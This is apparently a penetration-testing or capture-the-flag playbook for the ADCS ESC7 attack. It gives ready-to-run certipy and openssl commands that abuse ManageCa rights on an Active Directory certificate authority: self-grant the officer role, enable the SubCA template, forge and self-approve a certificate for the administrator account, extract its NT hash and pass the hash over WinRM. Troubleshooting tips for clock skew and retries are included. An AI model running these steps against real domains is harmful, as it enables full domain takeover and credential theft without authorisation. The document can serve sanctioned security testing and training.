# ADCS ESC7 — ManageCa → SubCA Self-Approval

## When this applies

- ADCS Enterprise CA where you have `ManageCa` rights on the CA.
- Goal: grant yourself the CA officer role, enable the disabled SubCA template, request and self-approve a cert with arbitrary UPN, then authenticate as Domain Admin.

## Technique

`ManageCa` (a.k.a. "Manage CA") on an Enterprise CA is unconditional Domain Admin — the holder can grant themselves the CA officer role, enable the disabled SubCA template (which does NOT require enroll-permission gating), submit a denied request for any UPN, approve it as the freshly-minted officer, and retrieve the cert. PKINIT → NT hash.

## Steps

Full 7-step recipe (wrap in `faketime -f "+Nh"` if KRB_AP_ERR_SKEW):

```bash
# 1. certipy ca -u <self>@dom -p <pwd> -dc-ip <DC> -ca <CA>  -add-officer <self>
certipy ca -u <self>@dom -p <pwd> -dc-ip <DC> -ca <CA>  -add-officer <self>
# 2. certipy ca -u <self>@dom -p <pwd> -dc-ip <DC> -ca <CA>  -enable-template SubCA
certipy ca -u <self>@dom -p <pwd> -dc-ip <DC> -ca <CA>  -enable-template SubCA
# 3. certipy req -u <self>@dom -p <pwd> -dc-ip <DC> -ca <CA>  -template SubCA \
#                     -upn administrator@dom -out admin-subca           # request DENIED — capture Request ID
certipy req -u <self>@dom -p <pwd> -dc-ip <DC> -ca <CA>  -template SubCA \
            -upn administrator@dom -out admin-subca
# 4. certipy ca -u <self>@dom -p <pwd> -dc-ip <DC> -ca <CA>  -issue-request <ID>
certipy ca -u <self>@dom -p <pwd> -dc-ip <DC> -ca <CA>  -issue-request <ID>
# 5. certipy req -u <self>@dom -p <pwd> -dc-ip <DC> -ca <CA>  -retrieve <ID> -out admin-cert
#        # ⚠ first call often errors "Failed to get dynamic TCP endpoint for CertSvc" / NoneType — retry once
certipy req -u <self>@dom -p <pwd> -dc-ip <DC> -ca <CA>  -retrieve <ID> -out admin-cert
# 6. openssl pkcs12 -export -inkey admin-subca.key -in admin-cert.crt -out admin.pfx -passout pass:
openssl pkcs12 -export -inkey admin-subca.key -in admin-cert.crt -out admin.pfx -passout pass:
# 7. certipy auth -pfx admin.pfx -dc-ip <DC> -username administrator -domain <dom>  # → NT hash
certipy auth -pfx admin.pfx -dc-ip <DC> -username administrator -domain <dom>
```

Then: `nxc winrm <DC> -u administrator -H <NT_hash>`   (pass-the-hash → root.txt)

## Verifying success

- Step 7 returns Administrator's NT hash.
- Subsequent PtH against WinRM/SMB on the DC succeeds.

## Common pitfalls

- Step 5 (`-retrieve`) frequently errors `Failed to get dynamic TCP endpoint for CertSvc` / NoneType on first call — retry once.
- Variant: `certipy ca -add-officer <self> && certipy ca -add-manager <self>` + alternate templates when SubCA was already enabled. ManageCa alone is sufficient — Manager is only needed for officer-add via the older API on legacy CAs.
- Wrap in `faketime` if KDC clock skew aborts auth in step 7.

## Tools

- certipy (`ca`, `req`, `auth`)
- openssl
